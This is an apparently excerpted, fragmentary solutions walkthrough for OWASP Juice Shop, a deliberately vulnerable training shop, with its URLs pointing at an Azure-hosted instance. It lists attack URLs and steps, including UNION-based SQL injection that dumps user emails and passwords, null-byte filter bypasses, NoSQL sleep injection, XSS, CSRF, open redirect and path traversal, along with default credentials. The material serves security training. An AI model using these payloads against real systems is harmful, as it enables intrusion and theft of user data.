...
1. Follow the link to titled _Check out our boring terms of use if you
   ...
   (<https://owaspappXXXXXt10.azurewebsites.net/ftp/legal.md>) on the _About Us_ page.
2. Successfully attempt to browse the directory by changing the URL into
   <https://owaspappXXXXXt10.azurewebsites.net/ftp>

   ![FTP directory browser](img/ftp_directory.png)
3. Open <https://owaspappXXXXXt10.azurewebsites.net/ftp/acquisitions.md> to solve the
   challenge.
...
* Visit <https://owaspappXXXXXt10.azurewebsites.net/rest/qwertz>
...
3. You will find yourself on
   <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/privacy-policy> which
   instantly solves this challenge for you.

### Retrieve the photo of Bjoern's cat in "melee combat-mode"

1. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/photo-wall>
...
5. Observe (in your DevTools _Network_ tab) that the request sent to the
   server is
   <https://owaspappXXXXXt10.azurewebsites.net/assets/public/images/uploads/%F0%9F%98%BC->
...
7. To get them over to the server intact, they must obviously be
   URL-encoded into `%23`
8. Open
   <https://owaspappXXXXXt10.azurewebsites.net/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg>
...
6. Open one of the three, e.g.
   <https://owaspappXXXXXt10.azurewebsites.net/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm>
   to solve the challenge.

### Follow the DRY principle while registering a user

1. Go to <https://owaspappXXXXXt10.azurewebsites.net/#/register>.
...
3. Navigating to https://owaspappXXXXXt10.azurewebsites.net/#/administration will give a `403
   Forbidden` error.
4. Log in to an administrator's account by solving the challenge
   ...
   * [Log in with the administrator's user credentials without previously changing them or applying SQL Injection](#log-in-with-the-administrators-user-credentials-without-previously-changing-them-or-applying-sql-injection)
     first and then navigate to https://owaspappXXXXXt10.azurewebsites.net/#/administration
...
5. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/basket> to solve the challenge.
...
* or log in with _Email_ `admin@juice-sh.op` and _Password_ `admin123`
  ...
  * or via REST API call <https://owaspappXXXXXt10.azurewebsites.net/api/Users> while
...
3. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/login> and log in with _Email_
   `mc.safesearch@juice-sh.op` and _Password_ `Mr. N00dles` to solve
   this challenge.

### Log in with the administrator's user credentials without previously changing them or applying SQL Injection

1. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/login>.
...
2. Request the security policy file from the server at
   <https://owaspappXXXXXt10.azurewebsites.net/.well-known/security.txt> to solve the
   challenge.
...
1. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/contact>.
...
1. Log in as any user.
2. Visit our user profile page at <https://owaspappXXXXXt10.azurewebsites.net/profile>.
...
1. Submit a `POST` request to <https://owaspappXXXXXt10.azurewebsites.net/api/Users> with:
...
2. Inspect HTTP traffic while putting items into your own shopping
   ...
   exists.
3. Submit a `POST` request to <https://owaspappXXXXXt10.azurewebsites.net/api/BasketItems>
...
1. Open the Network tab of your browser DevTools and visit
   <https://owaspappXXXXXt10.azurewebsites.net/#/contact>
2. You should notice a `GET` request to
   <https://owaspappXXXXXt10.azurewebsites.net/rest/captcha/> which retrieves the CAPTCHA for
...
* Rewrite your script so that it _parses the response from each CAPTCHA
  retrieval call_ to <https://owaspappXXXXXt10.azurewebsites.net/rest/captcha/> and sets the
...
1. Go to the _Contact Us_ form on <https://owaspappXXXXXt10.azurewebsites.net/#/contact>.
...
<https://owaspappXXXXXt10.azurewebsites.net/api/Feedbacks> endpoint. You could for example be
...
5. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/login> and log in with credentials
...
4. When changing the quantity via the UI, you will notice `PUT` requests
   to <https://owaspappXXXXXt10.azurewebsites.net/api/BasketItems/{id}> in the Network tab of
   your DevTools
...
7. Submit a `PUT` request to
   <https://owaspappXXXXXt10.azurewebsites.net/api/BasketItems/{id}> replacing `{id}` with
...
8. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/basket> to view _Your Basket_ with the
...
1. Open <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/privacy-policy>.
...
4. Combine those into the URL
   <https://owaspappXXXXXt10.azurewebsites.net/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility>
...
1. By searching for _O-Saft_ directly via the REST API with
   <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=o-saft> you will learn
   that it's database ID is `9`.
2. Submit a `PUT` request to <https://owaspappXXXXXt10.azurewebsites.net/api/Products/9>
   with:
...
5. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/forgot-password> and provide
...
<https://owaspappXXXXXt10.azurewebsites.net/assets/public/images/uploads/12.jpg> shows his
pet cat.
...
1. Visit https://owaspappXXXXXt10.azurewebsites.net/#/forgot-password and provide
...
6. Visit https://owaspappXXXXXt10.azurewebsites.net/#/forgot-password and provide
...
2. Craft a `POST` request to <https://owaspappXXXXXt10.azurewebsites.net/file-upload> with a
...
1. Craft a `POST` request to <https://owaspappXXXXXt10.azurewebsites.net/file-upload> with a
...
3. Visit https://owaspappXXXXXt10.azurewebsites.net/#/administration.
...
2. Copy your `Authorization` header from any HTTP request submitted via
   browser.
3. Submit a POST request to <https://owaspappXXXXXt10.azurewebsites.net/api/Products> with
...
4. Visit https://owaspappXXXXXt10.azurewebsites.net/#/search.
5. An alert box with the text "xss" should appear.
...
1. Solve the
   ...
   your attention.
2. Visit <https://owaspappXXXXXt10.azurewebsites.net/ftp> and notice the file
...
4. Following
   ...
   <https://owaspappXXXXXt10.azurewebsites.net/support/logs>.
...
1. Open https://owaspappXXXXXt10.azurewebsites.net/#/search and reload the page with `F5`
   while observing the _Network_ tab in your browser's DevTools
2. Recognize the `GET` request
   <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=> which returns the
   product data.
...
4. In that light, the `q=` parameter on the
   <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search> endpoint would not even
   be needed, but might be a relic from a different implementation of
   the search functionality. Test this theory by submitting
   <https://owaspappXXXXXt10.azurewebsites.net/rest/products/searchq=orange> which should
   give you a result such as

   ![JSON search result for "orange" keyword](img/search-result_orange.png)
5. Submit `';` as `q` via
   <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=';>
...
10. Go to <https://owaspappXXXXXt10.azurewebsites.net/#/login> and log in as any user.
...
12. Craft and send a `POST` request to
    <https://owaspappXXXXXt10.azurewebsites.net/api/BasketItems> with
    * `{"BasketId": "<Your Basket ID>", "ProductId": 10, "quantity": 1}`
      as body
    * and `application/json` as `Content-Type`
13. Go to <https://owaspappXXXXXt10.azurewebsites.net/#/basket> to verify that the "Christmas
...
4. Submitting either or all of the above ingredients at
   <https://owaspappXXXXXt10.azurewebsites.net/#/contact> will **not** solve this challenge -
...
10. Submit a comment containing both `Eurogium Edule` and `Hueteroneel`
    via <https://owaspappXXXXXt10.azurewebsites.net/#/contact> to solve this challenge
...
2. ...to download <https://owaspappXXXXXt10.azurewebsites.net/ftp/eastere.gg%2500.md>
...
5. Visit
   <https://owaspappXXXXXt10.azurewebsites.net/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg>
...
1. Browse to <https://owaspappXXXXXt10.azurewebsites.net/ftp> (like in
   [Access a confidential document](#access-a-confidential-document).
2. Opening <https://owaspappXXXXXt10.azurewebsites.net/ftp/package.json.bak> directly will
   fail complaining about an illegal file type.
3. Using a _Poison Null Byte_ (`%00`) the filter can be tricked, but
   only with a twist:
   * Accessing <https://owaspappXXXXXt10.azurewebsites.net/ftp/package.json.bak%00.md> will
   ...
   * ...because the `%` character needs to be URL-encoded (into `%25`)
     ...
     access.
4. <https://owaspappXXXXXt10.azurewebsites.net/ftp/package.json.bak%2500.md> will ultimately
   solve the challenge.
...
1. Use the _Poison Null Byte_ attack described in
   [Access a developer's forgotten backup file](#access-a-developers-forgotten-backup-file)...
2. ...to download
   <https://owaspappXXXXXt10.azurewebsites.net/ftp/coupons_2013.md.bak%2500.md>
...
3. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/track-order>, paste in your _Order ID_
   and then click _Track_.
4. In the network tab of your browser you should find a request similar
   to <https://owaspappXXXXXt10.azurewebsites.net/rest/track-order/7962-6e31e50a0c6f2ea3>.
...
8. Log in with your new user and immediately get your data exported via
   <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/data-export>.
...
1. Use the _Poison Null Byte_ attack described in
   [Access a developer's forgotten backup file](#access-a-developers-forgotten-backup-file)...
2. ...to download
   <https://owaspappXXXXXt10.azurewebsites.net/ftp/suspicious_errors.yml%2500.md>
...
2. Get the reviews of the product with database ID 1:
   https://owaspappXXXXXt10.azurewebsites.net/rest/products/1/reviews
3. Inject a
   [`sleep(integer ms)` command](https://docs.mongodb.com/manual/reference/method/sleep/)
   by changing the URL into
   https://owaspappXXXXXt10.azurewebsites.net/rest/products/sleep(2000)/reviews to solve the
   challenge

To avoid _real_ Denial-of-Service (DoS) issues, the Juice Shop will only
wait for a maximum of 2 seconds, so
https://owaspappXXXXXt10.azurewebsites.net/rest/products/sleep(999999)/reviews should not
take longer than https://owaspappXXXXXt10.azurewebsites.net/rest/products/sleep(2000)/reviews
to respond.
...
2. Submit a PATCH request to https://owaspappXXXXXt10.azurewebsites.net/rest/products/reviews
   with
...
1. Pick one of the redirect links in the application, e.g.
   <https://owaspappXXXXXt10.azurewebsites.net/redirect?to=https://github.com/bkimminich/juice-shop>
...
3. Removing the `to` parameter (<https://owaspappXXXXXt10.azurewebsites.net/redirect>) will
...
4. Craft a redirect URL so that the target-URL in `to` comes with an own
   ...
   <https://owaspappXXXXXt10.azurewebsites.net/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop>
...
6. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/contact>
...
3. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/contact>
...
long as you are logged in: Open <https://owaspappXXXXXt10.azurewebsites.net/#/administration>
while monitoring the HTTP calls in your browser's developer tools. The
response to <https://owaspappXXXXXt10.azurewebsites.net/rest/user/authentication-details>
...
4. Visit https://owaspappXXXXXt10.azurewebsites.net/#/about for a first "xss" alert (from the
   _Customer Feedback_ slideshow)

   ![XSS alert box](img/xss4_alert.png)
5. Visit https://owaspappXXXXXt10.azurewebsites.net/#/administration for a second "xss" alert
...
1. Log in as any user.
2. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/last-login-ip> where
...
4. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/last-login-ip> again
...
7. Unfortunately in the response (and also on
   <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/last-login-ip> after
...
9. In the JSON response you will notice `lastLoginIp: "1.2.3.4"` and
   ...
   <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/last-login-ip>.
...
11. Log in again and visit
    <https://owaspappXXXXXt10.azurewebsites.net/#/privacy-security/last-login-ip> see the
    alert popup.
...
4. Navigate to <https://owaspappXXXXXt10.azurewebsites.net/#/app-token-sale> or variations
   like <https://owaspappXXXXXt10.azurewebsites.net/#/token-sale> just to realize that these
   routes do not exist.
...
12. Navigate to <https://owaspappXXXXXt10.azurewebsites.net/#/tokensale-ico-ea> to solve this
    challenge.
...
3. Probe the responses of `/rest/user/change-password` on various
   inputs:
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/user/change-password?current=A> yields
     a `401` error saying `Password cannot be empty.`
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/user/change-password?current=A&new=B>
     yields a `401` error saying `New and repeated password do not
     match.`
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/user/change-password?current=A&new=B&repeat=C>
     also says `New and repeated password do not match.`
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/user/change-password?current=A&new=B&repeat=B>
     says `Current password is not correct.`
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/user/change-password?new=B&repeat=B>
...
5. Craft a GET request with Bender's `Authorization Bearer` header to
   <https://owaspappXXXXXt10.azurewebsites.net/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic>
   to solve the challenge.
...
src="https://owaspappXXXXXt10.azurewebsites.net/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic">`
will not work. Making someone click on the corresponding attack link
<https://owaspappXXXXXt10.azurewebsites.net/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E>
...
1. Log in with any user and go to
   <https://owaspappXXXXXt10.azurewebsites.net/#/deluxe-membership>
...
10. Try the `testDecal` parameter, e.g. by going to
    <https://owaspappXXXXXt10.azurewebsites.net/#/deluxe-membership?testDecal=test>. You will
...
11. As the logo references are relative, you cannot simply do e.g.
    <https://owaspappXXXXXt10.azurewebsites.net/#/deluxe-membership?testDecal=https:%2F%2Fplacekitten.com%2Fg%2F400%2F500>
...
12. As you are dealing with a relative path, you can try if path
    ...
    via
    <https://owaspappXXXXXt10.azurewebsites.net/#/deluxe-membership?testDecal=..%2F..%2F..%2Ftest>.
    This will indeed result in the image actually being requested as
    <https://owaspappXXXXXt10.azurewebsites.net/test>!
...
14. ...which _it does_ in the form of the
    <https://owaspappXXXXXt10.azurewebsites.net/redirect> endpoint! If you haven't done so
...
15. Combining that redirect exploit with the forgotten `testDecal` and
    ...
    like
    <https://owaspappXXXXXt10.azurewebsites.net/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop>
...
6. You will find one particularly interesting `GET` request that has
   ...
   HTTP/1.1" 401 39 "https://owaspappXXXXXt10.azurewebsites.net/" "Mozilla/5.0 (Linux;
...
9. Either way you will conclude that the password belongs to
   ...
   <https://owaspappXXXXXt10.azurewebsites.net/#/login> will solve the challenge

🤡 Did you notice that one of the next requests of `161.194.17.103` in
the leaked access log went to <https://owaspappXXXXXt10.azurewebsites.net/api/Complaints> and
...
1. Go to <https://owaspappXXXXXt10.azurewebsites.net/#/login> and try logging in with _Email_
...
1. Monitoring the HTTP calls to the backend when switching languages
   ...
   * <https://owaspappXXXXXt10.azurewebsites.net/i18n/en.json>
   * <https://owaspappXXXXXt10.azurewebsites.net/i18n/de_DE.json>
   * <https://owaspappXXXXXt10.azurewebsites.net/i18n/nl_NL.json>
   * <https://owaspappXXXXXt10.azurewebsites.net/i18n/zh_CN.json>
   * <https://owaspappXXXXXt10.azurewebsites.net/i18n/zh_HK.json>
   * etc.
...
5. Request <https://owaspappXXXXXt10.azurewebsites.net/i18n/tlh_AA.json> to solve the
   challenge. majQa'!
...
5. Change the one of the `null`s in payload to hopefully find a column
   ...
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null,null%20from%20users-->
     yields a `500` error with `SequelizeDatabaseError: SQLITE_ERROR: no
     such column: 2fa`.
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null,null%20from%20users-->
     fails with `no such column: 2fakey`.
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null,null%20from%20users-->
     fails with `no such column: 2fasecret`.
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null,null%20from%20users-->
     also fails with `no such column: totp`.
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null,null%20from%20users-->
     fails again yielding `no such column: totpkey`.
   * <https://owaspappXXXXXt10.azurewebsites.net/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users-->
...
1. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/login> and enter some known
   credentials.
...
4. _Log out_ and go back to <https://owaspappXXXXXt10.azurewebsites.net/#/login>. Make sure
...
8. Now visit <https://owaspappXXXXXt10.azurewebsites.net/#/login> again, but this time choose
   the _Log in with Google_ button to log in with your own Google
   account.
9. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/contact> and check the _Author_ field
...
JSON payload `POST`ed to <https://owaspappXXXXXt10.azurewebsites.net/rest/user/login>.

###  All your orders are belong to us

1. Open the network tab of your browser's DevTools.
2. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/track-order> and search for `x` to
   witness a `GET` request <https://owaspappXXXXXt10.azurewebsites.net/rest/track-order/x>
   being sent returning `{"status":"success","data":[{"orderId":"x"}]}`.
3. Search for `'` (single quote) as _Order ID_ now.
   <https://owaspappXXXXXt10.azurewebsites.net/rest/track-order/'> will throw an error
...
4. Searching for `''` (two single quotes) as _Order ID_ now will let
   <https://owaspappXXXXXt10.azurewebsites.net/rest/track-order/''> throw an `Unexpected
...
7. Search for `' || true || '` resulting in
   <https://owaspappXXXXXt10.azurewebsites.net/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'>
...
1. By manual or automated URL discovery you can find a
   ...
   <https://owaspappXXXXXt10.azurewebsites.net/api-docs> which describes the B2B API.
...
6. Back at <https://owaspappXXXXXt10.azurewebsites.net/api-docs/#/Order/post_orders> click
...
4. Visit https://owaspappXXXXXt10.azurewebsites.net/#/forgot-password and provide
...
6. Write a script that iterates over the word list and sends well-formed
   requests to `https://owaspappXXXXXt10.azurewebsites.net/rest/user/reset-password`. A rate
...
2. Download the product image from
   https://owaspappXXXXXt10.azurewebsites.net/public/images/products/3d_keychain.jpg and view
...
5. Download https://owaspappXXXXXt10.azurewebsites.net/public/images/products/JuiceShop.stl
...
1. Request <https://owaspappXXXXXt10.azurewebsites.net/3rdpartylicenses.txt> to retrieve the
...
3. As the Legal Information file you need to override lives in
   <https://owaspappXXXXXt10.azurewebsites.net/ftp/legal.md> and uploading files via _File
...
5. Log in as any user at <https://owaspappXXXXXt10.azurewebsites.net/#/login>.
6. Click _Contact Us_ and _Complain?_ to get to the _File Complaint_
   screen at <https://owaspappXXXXXt10.azurewebsites.net/#/complain>.
...
9. The challenge will be marked as solved! When you visit
   <https://owaspappXXXXXt10.azurewebsites.net/ftp/legal.md> you will see your overwritten
   Legal Information!
...
8. Send a `PUT` request to the URL
   <https://owaspappXXXXXt10.azurewebsites.net/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj>
   to solve this challenge.
...
1. Use your favorite forced directory browsing tool (or incredible
   guessing luck) to identify <https://owaspappXXXXXt10.azurewebsites.net/encryptionkeys> as
   having directory listing enabled.
2. Download the application's public JWT key from
   <https://owaspappXXXXXt10.azurewebsites.net/encryptionkeys/jwt.pub>
...
1. Liking a review normally results in a request to
   <https://owaspappXXXXXt10.azurewebsites.net/rest/products/reviews> which associates the
...
3. Write a script that simultaneously executes three requests to
   <https://owaspappXXXXXt10.azurewebsites.net/rest/products/reviews> with body e.g. `{id:
...
2. Get the support team's KeePass database file from
   <https://owaspappXXXXXt10.azurewebsites.net/ftp/incident-support.kdbx> (note how this file
...
9. Visit <https://owaspappXXXXXt10.azurewebsites.net/#/about> and cycle through the photos of
...
10. Download the photo
    <https://owaspappXXXXXt10.azurewebsites.net/public/images/carousel/6.jpg> and use it as a
...
3. To get the key and the IV, you should run a _Forced Directory
   ...
   1. Of the word lists coming with OWASP ZAP only
      ...
      the key file.
   2. The search will uncover <https://owaspappXXXXXt10.azurewebsites.net/encryptionkeys> as
      a browsable directory

      ![Browsable directoy "encryptionkeys"](img/encryptionkeys_directory.png)
   3. Open <https://owaspappXXXXXt10.azurewebsites.net/encryptionkeys/premium.key> to
...
5. Visit
   <https://owaspappXXXXXt10.azurewebsites.net/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us>
...
2. Similar to that SSTi challenge, the vulnerable place for this one is
   found on the <https://owaspappXXXXXt10.azurewebsites.net/profile> page.
...
9. Either way you should be able to identify the URL being called by it
   is
   <https://owaspappXXXXXt10.azurewebsites.net/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3>
...
2. Alternatively you also find three `.url` files with direct links in
   <https://owaspappXXXXXt10.azurewebsites.net/ftp/quarantine> but you'll probably need to
...
4. You probably realized by now that <https://owaspappXXXXXt10.azurewebsites.net/profile> is
...
pro motion.png) 2. Visit <https://owaspappXXXXXt10.azurewebsites.net/promotion> to watch the
...
learn that it loads its video from <https://owaspappXXXXXt10.azurewebsites.net/video> and
that the subtitles are directly embedded in th e p age itself. 4.
Inspecting the response for <https://owaspappXXXXXt10.azurewebsites.net/video> in the
...
<https://owaspappXXXXXt10.azurewebsites.net/assets/public/videos/JuiceShopJingle.mp4> works
fine. 6. Getting a directory listing for
<https://owaspappXXXXXt10.azurewebsites.net/assets/public/videos> does not work unf
...
<https://owaspappXXXXXt10.azurewebsites.net/assets/public/videos/JuiceShopJingle.vtt> proves
